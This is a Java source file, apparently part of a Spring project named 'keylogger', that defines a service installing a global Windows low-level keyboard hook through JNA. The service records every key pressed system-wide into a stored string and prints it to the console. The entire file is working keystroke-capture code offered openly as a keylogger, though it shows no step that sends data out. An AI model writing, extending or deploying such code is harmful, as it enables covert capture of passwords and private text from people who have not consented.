package com.badar.keylogger.Services;

import com.badar.keylogger.Helpers.KeyCodeConverter;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.*;
import com.sun.jna.platform.win32.WinDef.LRESULT;
import com.sun.jna.platform.win32.WinDef.WPARAM;
import com.sun.jna.platform.win32.WinUser.*;
import org.springframework.stereotype.Service;

@Service
public class GlobalKeyListenerService {
    private boolean shiftPressed = false;
    private StringBuilder storedInput = new StringBuilder();
    private static HHOOK hHook;
    private static final User32 user32 = User32.INSTANCE;

    public void startKeylogger() {
        LowLevelKeyboardProc keyboardHook = new LowLevelKeyboardProc() {
            public LRESULT callback(int nCode, WPARAM wParam, KBDLLHOOKSTRUCT info) {
                if (nCode >= 0) {
                    if (wParam.intValue() == WinUser.WM_KEYDOWN) {
                        String keypressed = KeyCodeConverter.getKeyName(info.vkCode);
                        storedInput.append(keypressed);
                        System.out.println(storedInput);
                        System.out.println("Key pressed: " + keypressed);
                    }
                }
                // CORRECT: Use Pointer.peer to get the native long value
                return user32.CallNextHookEx(
                        hHook,
                        nCode,
                        wParam,
                        new WinDef.LPARAM(Pointer.nativeValue(info.getPointer()))
                );
            }
        };

        hHook = user32.SetWindowsHookEx(
                WinUser.WH_KEYBOARD_LL,
                keyboardHook,
                Kernel32.INSTANCE.GetModuleHandle(null),
                0
        );

        // Message loop
        MSG msg = new MSG();
        while (user32.GetMessage(msg, null, 0, 0) != 0) {
            user32.TranslateMessage(msg);
            user32.DispatchMessage(msg);
        }

        user32.UnhookWindowsHookEx(hHook);
    }
}
